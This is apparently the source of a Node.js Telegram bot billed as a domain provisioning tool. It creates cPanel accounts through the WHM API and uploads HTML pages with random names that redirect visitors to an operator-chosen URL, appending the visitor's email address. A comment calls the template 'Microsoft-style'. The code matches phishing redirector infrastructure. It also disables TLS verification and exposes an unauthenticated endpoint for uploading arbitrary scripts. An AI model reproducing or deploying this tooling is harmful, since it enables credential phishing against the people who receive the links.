require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');
const https = require('https');
const crypto = require('crypto');
const pino = require('pino');
const express = require('express');
const path = require('path');
const fs = require('fs');

// __dirname is available by default in CommonJS
const app = express();

// Serve dashboard
app.use(express.static('.'));
app.get('/dashboard', (_, res) => {
  res.sendFile(path.join(__dirname, 'dashboard.html'));
});

// Logger
const baseLog = pino({ level: process.env.LOG_LEVEL || 'info' });
const L = id => baseLog.child({ reqId: id });

// HTTPS Agent for self-signed certificates
const tlsAgent = new https.Agent({ rejectUnauthorized: false });

// Random helpers
const rInt = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;
const rStr = (l, s = 'abcdefghijklmnopqrstuvwxyz0123456789') =>
  [...Array(l)].map(() => s[rInt(0, s.length - 1)]).join('');
const rFile = () => rStr(99) + '.html';

// WHM API Client
const WHM = axios.create({
  baseURL: process.env.WHM_SERVER,
  httpsAgent: tlsAgent,
  timeout: 30000,
  headers: {
    Authorization:
      'Basic ' +
      Buffer.from(
        `${process.env.WHM_USERNAME}:${process.env.WHM_PASSWORD}`,
        'utf8'
      ).toString('base64'),
  },
});

// User sessions
const sessions = new Map();

function getSession(ctx) {
  const id = ctx.from.id;
  if (!sessions.has(id)) sessions.set(id, {});
  return sessions.get(id);
}

// Create WHM/cPanel account
async function createAccount(domain, log) {
  const user = (
    domain.replace(/[^a-zA-Z0-9]/g, '').slice(0, 3).toLowerCase() +
    rStr(5)
  ).slice(0, 8);

  const pass = rStr(
    14,
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()'
  );

  const params = new URLSearchParams({
    domain,
    username: user,
    password: pass,
    plan: process.env.WHM_PACKAGE_NAME || 'default',
  });

  log.info({ domain, user }, 'Creating cPanel account');

  const { data } = await WHM.post('/json-api/createacct?api.version=1', params);

  if (!data?.metadata || data.metadata.result !== 1) {
    throw new Error(data?.metadata?.reason || 'Failed to create cPanel account');
  }

  log.info({ domain, user, ip: data.data.ip }, 'Account created successfully');

  return { 
    user, 
    password: pass,
    ip: data.data.ip 
  };
}

// Create directory in public_html
const createDirectory = (user, folderName) =>
  WHM.get('/json-api/cpanel', {
    params: {
      cpanel_jsonapi_user: user,
      cpanel_jsonapi_apiversion: 2,
      cpanel_jsonapi_module: 'Fileman',
      cpanel_jsonapi_func: 'mkdir',
      path: 'public_html',
      name: folderName,
    },
  });

// Upload script file to directory
const uploadScriptFile = (user, folderName, fileName, htmlContent) =>
  WHM.post('/json-api/cpanel', null, {
    params: {
      cpanel_jsonapi_user: user,
      cpanel_jsonapi_apiversion: 3,
      cpanel_jsonapi_module: 'Fileman',
      cpanel_jsonapi_func: 'save_file_content',
      dir: `/home/${user}/public_html/${folderName}`,
      file: fileName,
      content: htmlContent,
      from_charset: 'UTF-8',
      to_charset: 'UTF-8',
    },
  });

// Generate script HTML content
function generateScriptContent(redirectUrl, delay = 500) {
  const template = fs.readFileSync('./script-template.html', 'utf8');
  return template
    .replace('{{REDIRECT_URL}}', redirectUrl)
    .replace('{{DELAY}}', delay)
    .replace('{{TITLE}}', rStr(20));
}

// Generate custom script content using the Microsoft-style template
function generateCustomScriptContent(redirectUrl) {
  const template = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${rStr(20)}</title>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(redirect, 300);
        });

        // Function to handle redirection
        function redirect() {
            var email = getParameterByName('email'); // Attempt to get the email parameter
            var redirectUrl = "${redirectUrl}";

            if (email) {
                redirectUrl += email; // Append email if provided
            } else {
                console.log("No email provided. Redirecting without email.");
            }

            console.log("Redirecting to: " + redirectUrl);
            window.location.href = redirectUrl;
        }

        // Function to get URL parameters
        function getParameterByName(name, url = window.location.href) {
            name = name.replace(/[\\[\\]]/g, '\\\\$&');
            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
            var results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\\+/g, ' '));
        }

        // Function to manually trigger redirection via checkbox
        function handleCheckboxClick(checkbox) {
            if (checkbox.checked) {
                console.log("Checkbox is checked. Redirecting...");
                redirect();
            } else {
                console.log("Checkbox is not checked.");
            }
        }
    </script>
</head>
<body>
</body>
</html>`;
  return template;
}

// Bot initialization - only if token is provided
let bot = null;
if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_BOT_TOKEN !== 'your_telegram_bot_token_here') {
  bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);

  // Set webhook if in production
  if (process.env.NODE_ENV === 'production' && process.env.WEBHOOK_DOMAIN) {
    bot.telegram.setWebhook(`${process.env.WEBHOOK_DOMAIN}/bot${process.env.TELEGRAM_BOT_TOKEN}`);
  }
}

// Configure bot commands only if bot is available
if (bot) {
  // Start command
  bot.start(ctx => {
    const session = getSession(ctx);
    session.awaiting_domain = true;

    return ctx.reply(
      '🚀 *Domain Provisioning Bot*\n\n' +
      'Welcome! I can help you automatically provision domains with hosting.\n\n' +
      'Please send me a domain name and redirect URL separated by a space:\n' +
      'Format: `domain.com https://fb.com`\n\n' +
      'Example: `example.com https://fb.com`',
      { parse_mode: 'Markdown' }
    );
  });

  // Help command
  bot.help(ctx => {
    return ctx.reply(
      '📋 *Available Commands:*\n\n' +
      '/start - Start the provisioning process\n' +
      '/help - Show this help message\n' +
      '/cancel - Cancel current operation\n\n' +
      '*How it works:*\n' +
      '1. Send me your domain name\n' +
      '2. I create a cPanel hosting account\n' +
      '3. I set up 3 script folders with files\n' +
      '4. You get the URLs and server IP',
      { parse_mode: 'Markdown' }
    );
  });

  // Cancel command
  bot.command('cancel', ctx => {
    const session = getSession(ctx);
    sessions.delete(ctx.from.id);

    return ctx.reply('❌ Operation cancelled. Use /start to begin again.');
  });

  // Main text handler
  bot.on('text', async ctx => {
    const session = getSession(ctx);
    const text = ctx.message.text.trim();

    // Domain input handling
    if (session.awaiting_domain) {
      session.awaiting_domain = false;

      // Parse domain and redirect URL
      const parts = text.trim().split(' ');
      if (parts.length !== 2) {
        session.awaiting_domain = true;
        return ctx.reply(
          '❌ Invalid format. Please send domain and redirect URL separated by space:\n' +
          'Format: `domain.com https://fb.com`',
          { parse_mode: 'Markdown' }
        );
      }

      const [domainInput, redirectUrl] = parts;
      
      // Basic domain validation
      const domainRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,}$/;
      if (!domainRegex.test(domainInput)) {
        session.awaiting_domain = true;
        return ctx.reply(
          '❌ Invalid domain format. Please enter a valid domain and URL:\n' +
          'Format: `domain.com https://fb.com`',
          { parse_mode: 'Markdown' }
        );
      }

      // Basic URL validation
      if (!redirectUrl.startsWith('http://') && !redirectUrl.startsWith('https://')) {
        session.awaiting_domain = true;
        return ctx.reply(
          '❌ Invalid URL format. URL must start with http:// or https://\n' +
          'Format: `domain.com https://fb.com`',
          { parse_mode: 'Markdown' }
        );
      }

      const domain = domainInput.toLowerCase();
      const log = L(crypto.randomUUID().slice(0, 8));

      await ctx.reply(`🔄 Processing domain: *${domain}*\n\nThis may take a few moments...`, 
        { parse_mode: 'Markdown' });

      try {
        // Step 1: Create cPanel account
        log.info({ domain }, 'Starting domain provisioning');
        const { user, password, ip } = await createAccount(domain, log);

        await ctx.reply(`✅ cPanel account created!\n*Username:* ${user}\n*Server IP:* ${ip}`, 
          { parse_mode: 'Markdown' });

        // Step 2: Create 3 folders and upload script files
        const urls = [];

        for (let i = 1; i <= 3; i++) {
          const folderName = rInt(100, 999).toString();
          const fileName = rFile();

          try {
            // Create directory
            await createDirectory(user, folderName);
            log.info({ user, folderName }, 'Directory created');

            // Generate and upload script content
            const scriptContent = generateCustomScriptContent(redirectUrl);
            await uploadScriptFile(user, folderName, fileName, scriptContent);

            const url = `https://${domain}/${folderName}/${fileName}`;
            urls.push(url);

            log.info({ user, url }, 'Script file uploaded');

          } catch (err) {
            log.error({ err: err.message, folderName }, 'Failed to create folder or upload file');
            throw new Error(`Failed to setup folder ${i}: ${err.message}`);
          }
        }

        // Step 3: Return results to user
        const responseMessage = `🎉 *Domain provisioning completed!*\n\n` +
          `*Domain:* ${domain}\n` +
          `*Server IP:* ${ip}\n` +
          `*cPanel Username:* ${user}\n` +
          `*cPanel Password:* ${password}\n\n` +
          `*Script URLs:*\n` +
          urls.map((url, index) => `${index + 1}. ${url}`).join('\n') + '\n\n' +
          `⚠️ *Important:* Update your domain's nameservers to point to your hosting provider for the URLs to work.`;

        await ctx.reply(responseMessage, { parse_mode: 'Markdown' });

        log.info({ domain, urls, ip }, 'Domain provisioning completed successfully');

        // Send to admin if configured
        if (process.env.ADMIN_ID) {
          await bot.telegram.sendMessage(
            process.env.ADMIN_ID,
            `📊 *New Domain Provisioned*\n\n` +
            `*User:* @${ctx.from.username || ctx.from.id}\n` +
            `*Domain:* ${domain}\n` +
            `*IP:* ${ip}\n` +
            `*Username:* ${user}\n` +
            `*URLs Created:* ${urls.length}`,
            { parse_mode: 'Markdown' }
          );
        }

      } catch (error) {
        log.error({ error: error.message, domain }, 'Domain provisioning failed');
        await ctx.reply(
          `❌ *Provisioning failed:*\n\n${error.message}\n\nPlease try again with /start`,
          { parse_mode: 'Markdown' }
        );
      }

      // Clear session
      sessions.delete(ctx.from.id);
    } else {
      // No active session
      return ctx.reply('Please use /start to begin domain provisioning.');
    }
  });

  // Error handling
  bot.catch((err, ctx) => {
    const log = L('bot-error');
    log.error({ err: err.message, userId: ctx.from?.id }, 'Bot error occurred');
    return ctx.reply('❌ An error occurred. Please try again with /start');
  });

  // Webhook endpoint
  app.use(`/bot${process.env.TELEGRAM_BOT_TOKEN}`, bot.webhookCallback('/'));
}

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Test API endpoint for domain provisioning
app.post('/api/provision', express.json(), async (req, res) => {
  const { domain } = req.body;

  if (!domain) {
    return res.status(400).json({ error: 'Domain is required' });
  }

  const log = L(crypto.randomUUID().slice(0, 8));

  try {
    // Step 1: Create cPanel account
    log.info({ domain }, 'Starting domain provisioning via API');
    const { user, password, ip } = await createAccount(domain, log);

    // Step 2: Create 3 folders and upload script files
    const urls = [];
    const redirectUrl = process.env.DEFAULT_REDIRECT_URL || 'https://example.com';

    for (let i = 1; i <= 3; i++) {
      const folderName = rInt(100, 999).toString();
      const fileName = rFile();

      try {
        // Create directory
        await createDirectory(user, folderName);
        log.info({ user, folderName }, 'Directory created');

        // Generate and upload script content
        const scriptContent = generateCustomScriptContent(redirectUrl);
        await uploadScriptFile(user, folderName, fileName, scriptContent);

        const url = `https://${domain}/${folderName}/${fileName}`;
        urls.push(url);

        log.info({ user, url }, 'Script file uploaded');

      } catch (err) {
        log.error({ err: err.message, folderName }, 'Failed to create folder or upload file');
        throw new Error(`Failed to setup folder ${i}: ${err.message}`);
      }
    }

    const result = {
      domain,
      server_ip: ip,
      cpanel_username: user,
      cpanel_password: password,
      script_urls: urls,
      message: 'Domain provisioning completed successfully'
    };

    log.info({ domain, urls, ip }, 'Domain provisioning completed successfully via API');
    res.json(result);

  } catch (error) {
    log.error({ error: error.message, domain }, 'Domain provisioning failed via API');
    res.status(500).json({ 
      error: 'Provisioning failed', 
      message: error.message 
    });
  }
});

// Custom script file upload endpoint
app.post('/api/upload-script', express.json(), async (req, res) => {
  const { domain, scriptContent, customFileName } = req.body;

  if (!domain || !scriptContent) {
    return res.status(400).json({ error: 'Domain and script content are required' });
  }

  const log = L(crypto.randomUUID().slice(0, 8));

  try {
    // Find existing account by domain
    const accounts = await WHM.get('/json-api/listaccts?api.version=1');
    const account = accounts.data.data.acct.find(acc => acc.domain === domain);

    if (!account) {
      return res.status(404).json({ error: 'Domain not found in hosting accounts' });
    }

    const folderName = rInt(100, 999).toString();
    const fileName = customFileName || rFile();

    // Create directory and upload custom script
    await createDirectory(account.user, folderName);
    await uploadScriptFile(account.user, folderName, fileName, scriptContent);

    const url = `https://${domain}/${folderName}/${fileName}`;

    log.info({ domain, user: account.user, url }, 'Custom script uploaded');

    res.json({
      domain,
      folder: folderName,
      filename: fileName,
      url,
      message: 'Custom script uploaded successfully'
    });

  } catch (error) {
    log.error({ error: error.message, domain }, 'Custom script upload failed');
    res.status(500).json({ 
      error: 'Upload failed', 
      message: error.message 
    });
  }
});

// Start server
const PORT = process.env.PORT || 5000;
const server = app.listen(PORT, '0.0.0.0', () => {
  const log = L('server');
  log.info({ port: PORT }, 'Server started');

  // Use polling in development only if bot is initialized
  if (process.env.NODE_ENV !== 'production' && bot) {
    bot.launch();
    log.info('Bot started with polling');
  } else if (!bot) {
    log.info('Bot not initialized - Telegram token missing. Dashboard available at /dashboard');
  }
});

// Graceful shutdown
process.once('SIGINT', () => {
  const log = L('shutdown');
  log.info('Shutting down gracefully');
  if (bot) bot.stop('SIGINT');
  server.close();
});

process.once('SIGTERM', () => {
  const log = L('shutdown');
  log.info('Shutting down gracefully');
  if (bot) bot.stop('SIGTERM');
  server.close();
});